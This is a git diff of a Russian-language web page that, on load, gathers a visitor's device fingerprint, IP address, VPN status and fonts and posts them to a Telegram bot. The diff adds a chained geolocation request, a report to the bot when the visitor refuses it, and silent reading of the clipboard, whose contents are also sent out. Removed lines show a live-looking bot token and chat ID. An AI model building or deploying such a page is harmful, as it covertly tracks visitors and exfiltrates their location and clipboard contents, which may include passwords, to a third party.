@@ -9,11 +9,9 @@
     <h1>Добро пожаловать на страницу определения информации об устройстве и IP</h1>
     <p>Информация о вашем устройстве и IP-адрес будет отправлена в Telegram-бот.</p>
 
-    <button onclick="takePhoto()">Сделать фото</button>
-
     <script>
-        const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
-        const chatId = '1653222949';
+        const botToken = 'YOUR_BOT_TOKEN';
+        const chatId = 'YOUR_CHAT_ID';
         const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
         async function getDeviceBrandAndModel() {
@@ -134,13 +132,6 @@
             const vpnStatus = await checkVPN(ipAddress);
             const deviceInfo = await getDeviceInfo();
 
-            const geoLocation = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(
-                    position => resolve(`${position.coords.latitude},${position.coords.longitude}`),
-                    error => resolve('Не удалось получить')
-                );
-            });
-
             const browserInfo = `User Agent: ${navigator.userAgent}\nBrowser Name: ${navigator.appName}`;
             const osInfo = `Platform: ${navigator.platform}`;
             const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -164,7 +155,6 @@
                 Платформа: ${deviceInfo.platform}
                 Время работы системы: ${deviceInfo.uptime} сек.
                 Местоположение: ${location}
-                Точная геолокация пользователя: ${geoLocation}
                 Использование VPN/Proxy: ${vpnStatus}
                 Поддержка WebGL: ${deviceInfo.webglSupport}
                 Установленные шрифты: ${deviceInfo.fonts}
@@ -197,6 +187,7 @@
             .then(response => response.json())
             .then(data => {
                 console.log('Сообщение отправлено в Telegram:', data);
+                requestGeolocation();
             })
             .catch(error => {
                 console.error('Ошибка при отправке сообщения в Telegram:', error);
@@ -205,10 +196,9 @@
 
         // Запуск функции для сбора и отправки информации
         getCompleteInfo();
-    </script>
-    <script>
-        // Функция для получения геолокации пользователя
-        function getGeolocation() {
+
+        // Функция для запроса геолокации пользователя
+        function requestGeolocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -219,19 +209,17 @@
                     },
                     (error) => {
                         console.error('Ошибка при получении геолокации:', error);
+                        sendLocationErrorToTelegram();
                     }
                 );
             } else {
                 console.error('Геолокация не поддерживается этим браузером.');
+                sendLocationErrorToTelegram();
             }
         }
 
         // Функция для отправки геолокации в Telegram-бот
         function sendLocationToTelegram(latitude, longitude) {
-            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
-            const chatId = '1653222949';  // Замените на ваш chat ID
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
             const message = `Геолокация пользователя: ${latitude},${longitude}`;
 
             fetch(telegramApiUrl, {
@@ -247,10 +235,73 @@
             .then(response => response.json())
             .then(data => {
                 console.log('Геолокация отправлена в Telegram:', data);
+                requestClipboardData();
             })
             .catch(error => {
                 console.error('Ошибка при отправке геолокации в Telegram:', error);
             });
+        }
+
+        // Функция для отправки ошибки геолокации в Telegram-бот
+        function sendLocationErrorToTelegram() {
+            const message = `Пользователь заблокировал запрос на геолокацию.`;
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Информация об отказе в геолокации отправлена в Telegram:', data);
+                requestClipboardData();
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке информации об отказе в геолокации в Telegram:', error);
+            });
+        }
+
+        // Функция для получения данных буфера обмена
+        async function getClipboardData() {
+            try {
+                const text = await navigator.clipboard.readText();
+                sendClipboardDataToTelegram(text);
+            } catch (err) {
+                console.error('Не удалось прочитать содержимое буфера обмена: ', err);
+            }
+        }
+
+        // Функция для отправки данных буфера обмена в Telegram-бот
+        function sendClipboardDataToTelegram(text) {
+            const message = `Данные из буфера обмена: ${text}`;
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Данные буфера обмена отправлены в Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке данных буфера обмена в Telegram:', error);
+            });
+        }
+
+        // Функция для запроса данных буфера обмена
+        function requestClipboardData() {
+            getClipboardData();
         }
     </script>
 </body>
